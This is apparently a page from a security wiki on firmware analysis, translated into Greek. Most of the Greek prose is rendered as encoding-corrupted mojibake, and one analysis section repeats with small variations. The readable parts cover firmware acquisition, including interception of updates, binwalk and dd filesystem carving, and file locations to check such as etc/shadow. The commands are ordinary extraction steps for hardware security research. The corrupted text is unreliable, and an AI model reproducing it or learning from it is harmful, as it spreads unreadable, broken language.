# Firmware Analysis

{{#include ../../banners/hacktricks-training.md}}

## **Î•Î¹ÏƒÎ±Î³Ï‰Î³Î®**

### Î£Ï‡ÎµÏ„Î¹ÎºÎ¿Î¯ Ï€ÏŒÏÎ¿Î¹


{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}


Firmware ÎµÎ¯Î½Î±Î¹ Ï„Î¿ Î±Ï€Î±ÏÎ±Î¯Ï„Î·Ï„Î¿ Î»Î¿Î³Î¹ÏƒÎ¼Î¹ÎºÏŒ Ï€Î¿Ï… ÎµÏ€Î¹Ï„ÏÎ­Ï€ÎµÎ¹ ÏƒÏ„Î¹Ï‚ ÏƒÏ…ÏƒÎºÎµÏ…Î­Ï‚ Î½Î± Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î¿ÏÎ½ ÏƒÏ‰ÏƒÏ„Î¬, Î´Î¹Î±Ï‡ÎµÎ¹ÏÎ¹Î¶ÏŒÎ¼ÎµÎ½Î¿ ÎºÎ±Î¹ Î´Î¹ÎµÏ…ÎºÎ¿Î»ÏÎ½Î¿Î½Ï„Î±Ï‚ Ï„Î·Î½ ÎµÏ€Î¹ÎºÎ¿Î¹Î½Ï‰Î½Î¯Î± Î¼ÎµÏ„Î±Î¾Ï Ï„Ï‰Î½ hardware components ÎºÎ±Î¹ Ï„Î¿Ï… Î»Î¿Î³Î¹ÏƒÎ¼Î¹ÎºÎ¿Ï Î¼Îµ Ï„Î¿ Î¿Ï€Î¿Î¯Î¿ Î±Î»Î»Î·Î»ÎµÏ€Î¹Î´ÏÎ¿ÏÎ½ Î¿Î¹ Ï‡ÏÎ®ÏƒÏ„ÎµÏ‚. Î‘Ï€Î¿Î¸Î·ÎºÎµÏÎµÏ„Î±Î¹ ÏƒÎµ Î¼ÏŒÎ½Î¹Î¼Î· Î¼Î½Î®Î¼Î·, ÎµÎ¾Î±ÏƒÏ†Î±Î»Î¯Î¶Î¿Î½Ï„Î±Ï‚ ÏŒÏ„Î¹ Î· ÏƒÏ…ÏƒÎºÎµÏ…Î® Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Ï€ÏÎ¿ÏƒÏ€ÎµÎ»Î¬ÏƒÎµÎ¹ ÎºÏÎ¯ÏƒÎ¹Î¼ÎµÏ‚ Î¿Î´Î·Î³Î¯ÎµÏ‚ Î±Ï€ÏŒ Ï„Î· ÏƒÏ„Î¹Î³Î¼Î® Ï€Î¿Ï… Î¸Î± ÎµÎ½ÎµÏÎ³Î¿Ï€Î¿Î¹Î·Î¸ÎµÎ¯, Î¿Î´Î·Î³ÏÎ½Ï„Î±Ï‚ ÏƒÏ„Î·Î½ ÎµÎºÎºÎ¯Î½Î·ÏƒÎ· Ï„Î¿Ï… Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î¹ÎºÎ¿Ï ÏƒÏ…ÏƒÏ„Î®Î¼Î±Ï„Î¿Ï‚. Î— ÎµÎ¾Î­Ï„Î±ÏƒÎ· ÎºÎ±Î¹ Î· Ï€Î¹Î¸Î±Î½Î® Ï„ÏÎ¿Ï€Î¿Ï€Î¿Î¯Î·ÏƒÎ· Ï„Î¿Ï… firmware ÎµÎ¯Î½Î±Î¹ Î­Î½Î± ÎºÏÎ¯ÏƒÎ¹Î¼Î¿ Î²Î®Î¼Î± Î³Î¹Î± Ï„Î¿Î½ ÎµÎ½Ï„Î¿Ï€Î¹ÏƒÎ¼ÏŒ ÎµÏ…Ï€Î±Î¸ÎµÎ¹ÏÎ½ Î±ÏƒÏ†Î±Î»ÎµÎ¯Î±Ï‚.

## **Î£Ï…Î»Î»Î¿Î³Î® Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¹ÏÎ½**

**Î£Ï…Î»Î»Î¿Î³Î® Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¹ÏÎ½** ÎµÎ¯Î½Î±Î¹ Î­Î½Î± ÎºÏÎ¯ÏƒÎ¹Î¼Î¿ Î±ÏÏ‡Î¹ÎºÏŒ Î²Î®Î¼Î± Î³Î¹Î± Ï„Î·Î½ ÎºÎ±Ï„Î±Î½ÏŒÎ·ÏƒÎ· Ï„Î·Ï‚ ÏƒÏÎ½Î¸ÎµÏƒÎ·Ï‚ Î¼Î¹Î±Ï‚ ÏƒÏ…ÏƒÎºÎµÏ…Î®Ï‚ ÎºÎ±Î¹ Ï„Ï‰Î½ Ï„ÎµÏ‡Î½Î¿Î»Î¿Î³Î¹ÏÎ½ Ï€Î¿Ï… Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯. Î‘Ï…Ï„Î® Î· Î´Î¹Î±Î´Î¹ÎºÎ±ÏƒÎ¯Î± Ï€ÎµÏÎ¹Î»Î±Î¼Î²Î¬Î½ÎµÎ¹ Ï„Î· ÏƒÏ…Î»Î»Î¿Î³Î® Î´ÎµÎ´Î¿Î¼Î­Î½Ï‰Î½ ÏƒÏ‡ÎµÏ„Î¹ÎºÎ¬ Î¼Îµ:

- Î¤Î·Î½ CPU architecture ÎºÎ±Î¹ Ï„Î¿ Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î¹ÎºÏŒ ÏƒÏÏƒÏ„Î·Î¼Î± Ï€Î¿Ï… Ï„ÏÎ­Ï‡ÎµÎ¹
- Bootloader specifics
- Î¤Î¿ hardware layout ÎºÎ±Î¹ datasheets
- ÎœÎµÏ„ÏÎ¹ÎºÎ¬ ÎºÏÎ´Î¹ÎºÎ± ÎºÎ±Î¹ Ï„Î¿Ï€Î¿Î¸ÎµÏƒÎ¯ÎµÏ‚ Ï„Î¿Ï… source
- Î•Î¾Ï‰Ï„ÎµÏÎ¹ÎºÎ­Ï‚ Î²Î¹Î²Î»Î¹Î¿Î¸Î®ÎºÎµÏ‚ ÎºÎ±Î¹ Ï„ÏÏ€Î¿Ï…Ï‚ license
- Î™ÏƒÏ„Î¿ÏÎ¹ÎºÎ¬ updates ÎºÎ±Î¹ Ï€Î¹ÏƒÏ„Î¿Ï€Î¿Î¹Î®ÏƒÎµÎ¹Ï‚ ÎºÎ±Î½Î¿Î½Î¹ÏƒÎ¼ÏÎ½
- Î”Î¹Î±Î³ÏÎ¬Î¼Î¼Î±Ï„Î± Î±ÏÏ‡Î¹Ï„ÎµÎºÏ„Î¿Î½Î¹ÎºÎ®Ï‚ ÎºÎ±Î¹ ÏÎ¿Î®Ï‚
- Î‘Î¾Î¹Î¿Î»Î¿Î³Î®ÏƒÎµÎ¹Ï‚ Î±ÏƒÏ†Î±Î»ÎµÎ¯Î±Ï‚ ÎºÎ±Î¹ ÎµÎ½Ï„Î¿Ï€Î¹ÏƒÎ¼Î­Î½ÎµÏ‚ ÎµÏ…Ï€Î¬Î¸ÎµÎ¹ÎµÏ‚

Î“Î¹Î± Î±Ï…Ï„ÏŒÎ½ Ï„Î¿Î½ ÏƒÎºÎ¿Ï€ÏŒ, ÎµÏÎ³Î±Î»ÎµÎ¯Î± **OSINT** ÎµÎ¯Î½Î±Î¹ Î±Î½ÎµÎºÏ„Î¯Î¼Î·Ï„Î±, ÏŒÏ€Ï‰Ï‚ ÎºÎ±Î¹ Î· Î±Î½Î¬Î»Ï…ÏƒÎ· Î¿Ï€Î¿Î¹Ï‰Î½Î´Î®Ï€Î¿Ï„Îµ Î´Î¹Î±Î¸Î­ÏƒÎ¹Î¼Ï‰Î½ open-source software components Î¼Î­ÏƒÏ‰ Ï‡ÎµÎ¹ÏÎ¿ÎºÎ¯Î½Î·Ï„Î·Ï‚ ÎºÎ±Î¹ Î±Ï…Ï„Î¿Î¼Î±Ï„Î¿Ï€Î¿Î¹Î·Î¼Î­Î½Î·Ï‚ Î±Î½Î±ÏƒÎºÏŒÏ€Î·ÏƒÎ·Ï‚. Î•ÏÎ³Î±Î»ÎµÎ¯Î± ÏŒÏ€Ï‰Ï‚ [Coverity Scan](https://scan.coverity.com) ÎºÎ±Î¹ [Semmleâ€™s LGTM](https://lgtm.com/#explore) Ï€ÏÎ¿ÏƒÏ†Î­ÏÎ¿Ï…Î½ Î´Ï‰ÏÎµÎ¬Î½ static analysis Ï€Î¿Ï… Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Î±Î¾Î¹Î¿Ï€Î¿Î¹Î·Î¸ÎµÎ¯ Î³Î¹Î± Ï„Î¿Î½ ÎµÎ½Ï„Î¿Ï€Î¹ÏƒÎ¼ÏŒ Ï€Î¹Î¸Î±Î½ÏÎ½ Ï€ÏÎ¿Î²Î»Î·Î¼Î¬Ï„Ï‰Î½.

## **Î‘Ï€ÏŒÎºÏ„Î·ÏƒÎ· Ï„Î¿Ï… Firmware**

Î— Î±Ï€ÏŒÎºÏ„Î·ÏƒÎ· Ï„Î¿Ï… firmware Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Ï€ÏÎ¿ÏƒÎµÎ³Î³Î¹ÏƒÏ„ÎµÎ¯ Î¼Îµ Î´Î¹Î¬Ï†Î¿ÏÎ¿Ï…Ï‚ Ï„ÏÏŒÏ€Î¿Ï…Ï‚, Î¿ ÎºÎ±Î¸Î­Î½Î±Ï‚ Î¼Îµ Ï„Î¿ Î´Î¹ÎºÏŒ Ï„Î¿Ï… ÎµÏ€Î¯Ï€ÎµÎ´Î¿ Ï€Î¿Î»Ï…Ï€Î»Î¿ÎºÏŒÏ„Î·Ï„Î±Ï‚:

- **Î†Î¼ÎµÏƒÎ±** Î±Ï€ÏŒ Ï„Î·Î½ Ï€Î·Î³Î® (developers, manufacturers)
- **Î§Ï„Î¯Î¶Î¿Î½Ï„Î¬Ï‚** Ï„Î¿ Î±Ï€ÏŒ Ï„Î¹Ï‚ Ï€Î±ÏÎµÏ‡ÏŒÎ¼ÎµÎ½ÎµÏ‚ Î¿Î´Î·Î³Î¯ÎµÏ‚
- **ÎšÎ±Ï„ÎµÎ²Î¬Î¶Î¿Î½Ï„Î¬Ï‚** Ï„Î¿ Î±Ï€ÏŒ ÎµÏ€Î¯ÏƒÎ·Î¼Î¿Ï…Ï‚ support sites
- Î§ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ **Google dork** queries Î³Î¹Î± Ï„Î·Î½ ÎµÏÏÎµÏƒÎ· hosted firmware files
- Î ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÎµ **cloud storage** Î±Ï€ÎµÏ…Î¸ÎµÎ¯Î±Ï‚, Î¼Îµ ÎµÏÎ³Î±Î»ÎµÎ¯Î± ÏŒÏ€Ï‰Ï‚ [S3Scanner](https://github.com/sa7mon/S3Scanner)
- Î Î±ÏÎµÎ¼Ï€ÏŒÎ´Î¹ÏƒÎ· **updates** Î¼Î­ÏƒÏ‰ man-in-the-middle Ï„ÎµÏ‡Î½Î¹ÎºÏÎ½
- **Î•Î¾Î±Î³Ï‰Î³Î®** Î±Ï€ÏŒ Ï„Î· ÏƒÏ…ÏƒÎºÎµÏ…Î® Î¼Î­ÏƒÏ‰ ÏƒÏ…Î½Î´Î­ÏƒÎµÏ‰Î½ ÏŒÏ€Ï‰Ï‚ **UART**, **JTAG**, Î® **PICit**
- **Sniffing** Î³Î¹Î± update requests Î¼Î­ÏƒÎ± ÏƒÏ„Î·Î½ ÎµÏ€Î¹ÎºÎ¿Î¹Î½Ï‰Î½Î¯Î± Ï„Î·Ï‚ ÏƒÏ…ÏƒÎºÎµÏ…Î®Ï‚
- Î•Î½Ï„Î¿Ï€Î¹ÏƒÎ¼ÏŒÏ‚ ÎºÎ±Î¹ Ï‡ÏÎ®ÏƒÎ· hardcoded update endpoints
- **Dumping** Î±Ï€ÏŒ Ï„Î¿Î½ bootloader Î® Ï„Î¿ Î´Î¯ÎºÏ„Ï…Î¿
- **Î‘Ï†Î±Î¯ÏÎµÏƒÎ· ÎºÎ±Î¹ Î±Î½Î¬Î³Î½Ï‰ÏƒÎ·** Ï„Î¿Ï… storage chip, ÏŒÏ„Î±Î½ ÏŒÎ»Î± Ï„Î± Î¬Î»Î»Î± Î±Ï€Î¿Ï„ÏÏ‡Î¿Ï…Î½, Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ ÎºÎ±Ï„Î¬Î»Î»Î·Î»Î± hardware ÎµÏÎ³Î±Î»ÎµÎ¯Î±

## Î‘Î½Î¬Î»Ï…ÏƒÎ· Ï„Î¿Ï… firmware

Î¤ÏÏÎ± Ï€Î¿Ï… **Î­Ï‡ÎµÏ„Îµ Ï„Î¿ firmware**, Ï‡ÏÎµÎ¹Î¬Î¶ÎµÏ„Î±Î¹ Î½Î± ÎµÎ¾Î¬Î³ÎµÏ„Îµ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚ Î³Î¹' Î±Ï…Ï„ÏŒ Î³Î¹Î± Î½Î± Î³Î½Ï‰ÏÎ¯Î¶ÎµÏ„Îµ Ï€ÏÏ‚ Î½Î± Ï„Î¿ Ï‡ÎµÎ¹ÏÎ¹ÏƒÏ„ÎµÎ¯Ï„Îµ. Î”Î¹Î¬Ï†Î¿ÏÎ± ÎµÏÎ³Î±Î»ÎµÎ¯Î± Ï€Î¿Ï… Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÎµÏ„Îµ Î³Î¹Î± Î±Ï…Ï„ÏŒ:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```
If you don't find much with those tools check the **entropy** of the image with `binwalk -E <bin>`, if low entropy, then it's not likely to be encrypted. If high entropy, Its likely encrypted (or compressed in some way).

Moreover, you can use these tools to extract **files embedded inside the firmware**:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Or [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) to inspect the file.

### Getting the Filesystem

With the previous commented tools like `binwalk -ev <bin>` you should have been able to **extract the filesystem**.\
Binwalk usually extracts it inside a **folder named as the filesystem type**, which usually is one of the following: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Manual Filesystem Extraction

Sometimes, binwalk will **not have the magic byte of the filesystem in its signatures**. In these cases, use binwalk to **find the offset of the filesystem and carve the compressed filesystem** from the binary and **manually extract** the filesystem according to its type using the steps below.
```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```
Î•ÎºÏ„ÎµÎ»Î­ÏƒÏ„Îµ Ï„Î·Î½ Î±ÎºÏŒÎ»Î¿Ï…Î¸Î· **dd command** Î³Î¹Î± carving Ï„Î¿Ï… Squashfs filesystem.
```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```
Î•Î½Î±Î»Î»Î±ÎºÏ„Î¹ÎºÎ¬, Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± ÎµÎºÏ„ÎµÎ»ÎµÏƒÏ„ÎµÎ¯ ÎºÎ±Î¹ Î· Ï€Î±ÏÎ±ÎºÎ¬Ï„Ï‰ ÎµÎ½Ï„Î¿Î»Î®.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- Î“Î¹Î± squashfs (Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®Î¸Î·ÎºÎµ ÏƒÏ„Î¿ Ï€Î±ÏÎ±Ï€Î¬Î½Ï‰ Ï€Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î±)

`$ unsquashfs dir.squashfs`

Î¤Î± Î±ÏÏ‡ÎµÎ¯Î± Î¸Î± Î²ÏÎ¯ÏƒÎºÎ¿Î½Ï„Î±Î¹ ÏƒÏ„Î¿Î½ ÎºÎ±Ï„Î¬Î»Î¿Î³Î¿ `squashfs-root` ÏƒÏ„Î· ÏƒÏ…Î½Î­Ï‡ÎµÎ¹Î±.

- Î“Î¹Î± Î±ÏÏ‡ÎµÎ¯Î± CPIO

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- Î“Î¹Î± ÏƒÏ…ÏƒÏ„Î®Î¼Î±Ï„Î± Î±ÏÏ‡ÎµÎ¯Ï‰Î½ jffs2

`$ jefferson rootfsfile.jffs2`

- Î“Î¹Î± ÏƒÏ…ÏƒÏ„Î®Î¼Î±Ï„Î± Î±ÏÏ‡ÎµÎ¯Ï‰Î½ ubifs Î¼Îµ NAND flash

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## Î‘Î½Î¬Î»Ï…ÏƒÎ· Firmware

ÎœÏŒÎ»Î¹Ï‚ Î±Ï€Î¿ÎºÏ„Î·Î¸ÎµÎ¯ Ï„Î¿ firmware, ÎµÎ¯Î½Î±Î¹ Î±Ï€Î±ÏÎ±Î¯Ï„Î·Ï„Î¿ Î½Î± Ï„Î¿ Î±Î½Î±Î»ÏÏƒÎ¿Ï…Î¼Îµ Î³Î¹Î± Î½Î± ÎºÎ±Ï„Î±Î½Î¿Î®ÏƒÎ¿Ï…Î¼Îµ Ï„Î· Î´Î¿Î¼Î® Ï„Î¿Ï… ÎºÎ±Î¹ Ï„Î¹Ï‚ Ï€Î¹Î¸Î±Î½Î­Ï‚ ÎµÏ…Ï€Î¬Î¸ÎµÎ¹ÎµÏ‚. Î‘Ï…Ï„Î® Î· Î´Î¹Î±Î´Î¹ÎºÎ±ÏƒÎ¯Î± Ï€ÎµÏÎ¹Î»Î±Î¼Î²Î¬Î½ÎµÎ¹ Ï„Î· Ï‡ÏÎ®ÏƒÎ· Î´Î¹Î±Ï†ÏŒÏÏ‰Î½ ÎµÏÎ³Î±Î»ÎµÎ¯Ï‰Î½ Î³Î¹Î± Î½Î± Î±Î½Î±Î»ÏÏƒÎ¿Ï…Î¼Îµ ÎºÎ±Î¹ Î½Î± ÎµÎ¾Î¬Î³Î¿Ï…Î¼Îµ Ï€Î¿Î»ÏÏ„Î¹Î¼Î± Î´ÎµÎ´Î¿Î¼Î­Î½Î± Î±Ï€ÏŒ Ï„Î¿ firmware image.

### Î•ÏÎ³Î±Î»ÎµÎ¯Î± Î±ÏÏ‡Î¹ÎºÎ®Ï‚ Î±Î½Î¬Î»Ï…ÏƒÎ·Ï‚

Î Î±ÏÎ­Ï‡ÎµÏ„Î±Î¹ Î­Î½Î± ÏƒÏÎ½Î¿Î»Î¿ ÎµÎ½Ï„Î¿Î»ÏÎ½ Î³Î¹Î± Ï„Î·Î½ Î±ÏÏ‡Î¹ÎºÎ® ÎµÏ€Î¹Î¸ÎµÏÏÎ·ÏƒÎ· Ï„Î¿Ï… Î´Ï…Î±Î´Î¹ÎºÎ¿Ï Î±ÏÏ‡ÎµÎ¯Î¿Ï… (Î±Î½Î±Ï†ÎµÏÏŒÎ¼ÎµÎ½Î¿Ï… Ï‰Ï‚ `<bin>`). ÎŸÎ¹ ÎµÎ½Ï„Î¿Î»Î­Ï‚ Î±Ï…Ï„Î­Ï‚ Î²Î¿Î·Î¸Î¿ÏÎ½ ÏƒÏ„Î¿Î½ ÎµÎ½Ï„Î¿Ï€Î¹ÏƒÎ¼ÏŒ Ï„ÏÏ€Ï‰Î½ Î±ÏÏ‡ÎµÎ¯Ï‰Î½, ÏƒÏ„Î·Î½ ÎµÎ¾Î±Î³Ï‰Î³Î® strings, ÏƒÏ„Î·Î½ Î±Î½Î¬Î»Ï…ÏƒÎ· Î´Ï…Î±Î´Î¹ÎºÏÎ½ Î´ÎµÎ´Î¿Î¼Î­Î½Ï‰Î½ ÎºÎ±Î¹ ÏƒÏ„Î·Î½ ÎºÎ±Ï„Î±Î½ÏŒÎ·ÏƒÎ· Ï„Ï‰Î½ Î»ÎµÏ€Ï„Î¿Î¼ÎµÏÎµÎ¹ÏÎ½ partition ÎºÎ±Î¹ filesystem:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```
Î“Î¹Î± Î½Î± ÎµÎºÏ„Î¹Î¼Î·Î¸ÎµÎ¯ Î· ÎºÎ±Ï„Î¬ÏƒÏ„Î±ÏƒÎ· ÎºÏÏ…Ï€Ï„Î¿Î³ÏÎ¬Ï†Î·ÏƒÎ·Ï‚ Ï„Î·Ï‚ ÎµÎ¹ÎºÏŒÎ½Î±Ï‚, ÎµÎ»Î­Î³Ï‡ÎµÏ„Î±Î¹ Î· **entropy** Î¼Îµ `binwalk -E <bin>`. Î§Î±Î¼Î·Î»Î® entropy Ï…Ï€Î¿Î´Î·Î»ÏÎ½ÎµÎ¹ Î­Î»Î»ÎµÎ¹ÏˆÎ· ÎºÏÏ…Ï€Ï„Î¿Î³ÏÎ¬Ï†Î·ÏƒÎ·Ï‚, ÎµÎ½Ï Ï…ÏˆÎ·Î»Î® entropy Ï…Ï€Î¿Î´ÎµÎ¹ÎºÎ½ÏÎµÎ¹ Ï€Î¹Î¸Î±Î½Î® ÎºÏÏ…Ï€Ï„Î¿Î³ÏÎ¬Ï†Î·ÏƒÎ· Î® ÏƒÏ…Î¼Ï€Î¯ÎµÏƒÎ·.

Î“Î¹Î± Ï„Î·Î½ ÎµÎ¾Î±Î³Ï‰Î³Î® Ï„Ï‰Î½ **embedded files**, Ï€ÏÎ¿Ï„ÎµÎ¯Î½Î¿Î½Ï„Î±Î¹ ÎµÏÎ³Î±Î»ÎµÎ¯Î± ÎºÎ±Î¹ Ï€ÏŒÏÎ¿Î¹ ÏŒÏ€Ï‰Ï‚ Î· Ï„ÎµÎºÎ¼Î·ÏÎ¯Ï‰ÏƒÎ· **file-data-carving-recovery-tools** ÎºÎ±Î¹ Ï„Î¿ **binvis.io** Î³Î¹Î± ÎµÏ€Î¹Î¸ÎµÏÏÎ·ÏƒÎ· Î±ÏÏ‡ÎµÎ¯Ï‰Î½.

### Î•Î¾Î±Î³Ï‰Î³Î® Ï„Î¿Ï… filesystem

Î§ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ `binwalk -ev <bin>`, ÏƒÏ…Î½Î®Î¸Ï‰Ï‚ Î¼Ï€Î¿ÏÎµÎ¯ ÎºÎ±Î½ÎµÎ¯Ï‚ Î½Î± ÎµÎ¾Î±Î³Î¬Î³ÎµÎ¹ Ï„Î¿ filesystem, ÏƒÏ…Ï‡Î½Î¬ ÏƒÎµ Î­Î½Î±Î½ ÎºÎ±Ï„Î¬Î»Î¿Î³Î¿ Î¿Î½Î¿Î¼Î±Ï„Î¹ÏƒÎ¼Î­Î½Î¿ Î±Ï€ÏŒ Ï„Î¿Î½ Ï„ÏÏ€Î¿ Ï„Î¿Ï… filesystem (Ï€.Ï‡. squashfs, ubifs). Î©ÏƒÏ„ÏŒÏƒÎ¿, ÏŒÏ„Î±Î½ Ï„Î¿ **binwalk** Î±Ï€Î¿Ï„ÏÏ‡ÎµÎ¹ Î½Î± Î±Î½Î±Î³Î½Ï‰ÏÎ¯ÏƒÎµÎ¹ Ï„Î¿Î½ Ï„ÏÏ€Î¿ Ï„Î¿Ï… filesystem Î»ÏŒÎ³Ï‰ Î­Î»Î»ÎµÎ¹ÏˆÎ·Ï‚ magic bytes, Î±Ï€Î±Î¹Ï„ÎµÎ¯Ï„Î±Î¹ Ï‡ÎµÎ¹ÏÎ¿ÎºÎ¯Î½Î·Ï„Î· ÎµÎ¾Î±Î³Ï‰Î³Î®. Î‘Ï…Ï„ÏŒ Ï€ÎµÏÎ¹Î»Î±Î¼Î²Î¬Î½ÎµÎ¹ Ï„Î· Ï‡ÏÎ®ÏƒÎ· Ï„Î¿Ï… `binwalk` Î³Î¹Î± Ï„Î¿Î½ ÎµÎ½Ï„Î¿Ï€Î¹ÏƒÎ¼ÏŒ Ï„Î¿Ï… filesystem offset, Î±ÎºÎ¿Î»Î¿Ï…Î¸Î¿ÏÎ¼ÎµÎ½Î¿ Î±Ï€ÏŒ Ï„Î·Î½ ÎµÎ½Ï„Î¿Î»Î® `dd` Î³Î¹Î± Î½Î± carve out Ï„Î¿ filesystem:
```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```
Î£Ï„Î· ÏƒÏ…Î½Î­Ï‡ÎµÎ¹Î±, Î±Î½Î¬Î»Î¿Î³Î± Î¼Îµ Ï„Î¿Î½ Ï„ÏÏ€Î¿ Ï„Î¿Ï… filesystem (Ï€.Ï‡. squashfs, cpio, jffs2, ubifs), Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î¿ÏÎ½Ï„Î±Î¹ Î´Î¹Î±Ï†Î¿ÏÎµÏ„Î¹ÎºÎ­Ï‚ ÎµÎ½Ï„Î¿Î»Î­Ï‚ Î³Î¹Î± Ï‡ÎµÎ¹ÏÎ¿ÎºÎ¯Î½Î·Ï„Î· ÎµÎ¾Î±Î³Ï‰Î³Î® Ï„Î¿Ï… Ï€ÎµÏÎ¹ÎµÏ‡Î¿Î¼Î­Î½Î¿Ï….

### Î‘Î½Î¬Î»Ï…ÏƒÎ· ÏƒÏ…ÏƒÏ„Î®Î¼Î±Ï„Î¿Ï‚ Î±ÏÏ‡ÎµÎ¯Ï‰Î½

ÎœÎµ Ï„Î¿ ÏƒÏÏƒÏ„Î·Î¼Î± Î±ÏÏ‡ÎµÎ¯Ï‰Î½ ÎµÎ¾Î±Î³Î¼Î­Î½Î¿, Î¾ÎµÎºÎ¹Î½Î¬ Î· Î±Î½Î±Î¶Î®Ï„Î·ÏƒÎ· Î³Î¹Î± ÎµÏ…Ï€Î¬Î¸ÎµÎ¹ÎµÏ‚. Î”Î¯Î½ÎµÏ„Î±Î¹ Ï€ÏÎ¿ÏƒÎ¿Ï‡Î® ÏƒÎµ insecure network daemons, hardcoded credentials, API endpoints, update server functionalities, uncompiled code, startup scripts ÎºÎ±Î¹ compiled binaries Î³Î¹Î± offline analysis.

**ÎšÏÏÎ¹ÎµÏ‚ Ï„Î¿Ï€Î¿Î¸ÎµÏƒÎ¯ÎµÏ‚** ÎºÎ±Î¹ **Î±Î½Ï„Î¹ÎºÎµÎ¯Î¼ÎµÎ½Î±** Ï€ÏÎ¿Ï‚ Î­Î»ÎµÎ³Ï‡Î¿ Ï€ÎµÏÎ¹Î»Î±Î¼Î²Î¬Î½Î¿Ï…Î½:

- **etc/shadow** ÎºÎ±Î¹ **etc/passwd** Î³Î¹Î± Î´Î¹Î±Ï€Î¹ÏƒÏ„ÎµÏ…Ï„Î®ÏÎ¹Î± Ï‡ÏÎ·ÏƒÏ„ÏÎ½
- Î Î¹ÏƒÏ„Î¿Ï€Î¿Î¹Î·Ï„Î¹ÎºÎ¬ SSL ÎºÎ±Î¹ ÎºÎ»ÎµÎ¹Î´Î¹Î¬ ÏƒÏ„Î¿ **etc/ssl**
- Î‘ÏÏ‡ÎµÎ¯Î± ÏÏ…Î¸Î¼Î¯ÏƒÎµÏ‰Î½ ÎºÎ±Î¹ script Î³Î¹Î± Ï€Î¹Î¸Î±Î½Î­Ï‚ ÎµÏ…Ï€Î¬Î¸ÎµÎ¹ÎµÏ‚
- Î•Î½ÏƒÏ‰Î¼Î±Ï„Ï‰Î¼Î­Î½Î± binaries Î³Î¹Î± Ï€ÎµÏÎ±Î¹Ï„Î­ÏÏ‰ Î±Î½Î¬Î»Ï…ÏƒÎ·
- Î£Ï…Î½Î®Î¸ÎµÎ¹Ï‚ web servers ÎºÎ±Î¹ binaries ÏƒÎµ ÏƒÏ…ÏƒÎºÎµÏ…Î­Ï‚ IoT

Î Î¿Î»Î»Î¬ ÎµÏÎ³Î±Î»ÎµÎ¯Î± Î²Î¿Î·Î¸Î¿ÏÎ½ ÏƒÏ„Î¿Î½ ÎµÎ½Ï„Î¿Ï€Î¹ÏƒÎ¼ÏŒ ÎµÏ…Î±Î¯ÏƒÎ¸Î·Ï„Ï‰Î½ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¹ÏÎ½ ÎºÎ±Î¹ ÎµÏ…Ï€Î±Î¸ÎµÎ¹ÏÎ½ Î¼Î­ÏƒÎ± ÏƒÏ„Î¿ ÏƒÏÏƒÏ„Î·Î¼Î± Î±ÏÏ‡ÎµÎ¯Ï‰Î½:

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) ÎºÎ±Î¹ [**Firmwalker**](https://github.com/craigz28/firmwalker) Î³Î¹Î± Î±Î½Î±Î¶Î®Ï„Î·ÏƒÎ· ÎµÏ…Î±Î¯ÏƒÎ¸Î·Ï„Ï‰Î½ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¹ÏÎ½
